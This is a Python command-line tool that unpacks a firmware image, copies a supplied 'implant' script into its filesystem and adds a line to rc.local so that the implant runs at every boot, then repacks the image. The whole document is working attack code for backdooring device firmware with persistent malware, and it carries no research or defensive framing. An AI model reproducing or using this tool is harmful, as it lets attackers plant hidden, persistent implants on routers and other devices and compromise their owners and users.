#!/usr/bin/env python3

import os
import shutil
import argparse
import subprocess
import tempfile

IMPLANT_SCRIPT = "payload_launcher.py"
RC_LOCAL_PATH = "etc/rc.local"  # Common boot script for init systems

def unpack_firmware(firmware_path, extract_dir):
    print(f"[+] Unpacking firmware: {firmware_path}")
    os.makedirs(extract_dir, exist_ok=True)
    subprocess.run(["binwalk", "-e", firmware_path, "-C", extract_dir], check=True)

def find_root_fs(extract_dir):
    for root, dirs, files in os.walk(extract_dir):
        if "etc" in dirs and "rc.local" in os.listdir(os.path.join(root, "etc")):
            return root
    raise RuntimeError("[!] Root filesystem with rc.local not found.")

def inject_implant(root_fs, implant_source):
    rc_path = os.path.join(root_fs, RC_LOCAL_PATH)
    dest_implant = os.path.join(root_fs, "tmp", IMPLANT_SCRIPT)
    os.makedirs(os.path.dirname(dest_implant), exist_ok=True)

    shutil.copy2(implant_source, dest_implant)
    os.chmod(dest_implant, 0o755)

    print(f"[+] Implant copied to {dest_implant}")
    
    with open(rc_path, "r+") as f:
        content = f.read()
        if f"/tmp/{IMPLANT_SCRIPT}" not in content:
            f.seek(0)
            f.write("#!/bin/sh\n")
            f.write(f"/tmp/{IMPLANT_SCRIPT} &\n")
            f.write(content)
            print(f"[+] rc.local modified for persistence")

def repack_firmware(root_fs_dir, output_firmware_path):
    print(f"[+] Repacking firmware to: {output_firmware_path}")
    subprocess.run([
        "fakeroot",
        "genext2fs",
        "-d", root_fs_dir,
        "-b", "8192",
        output_firmware_path
    ], check=True)

def main():
    parser = argparse.ArgumentParser(description="Inject persistent Python implant into firmware")
    parser.add_argument("--firmware", required=True, help="Input firmware image path")
    parser.add_argument("--implant", required=True, help="Path to implant Python script")
    parser.add_argument("--output", required=True, help="Output path for modified firmware")

    args = parser.parse_args()

    with tempfile.TemporaryDirectory() as tempdir:
        try:
            unpack_dir = os.path.join(tempdir, "unpacked")
            unpack_firmware(args.firmware, unpack_dir)

            root_fs = find_root_fs(unpack_dir)
            inject_implant(root_fs, args.implant)

            repack_firmware(root_fs, args.output)

        except Exception as e:
            print(f"[!] Error: {e}")
        else:
            print("[+] Firmware successfully modified with persistent implant.")

if __name__ == "__main__":
    main()
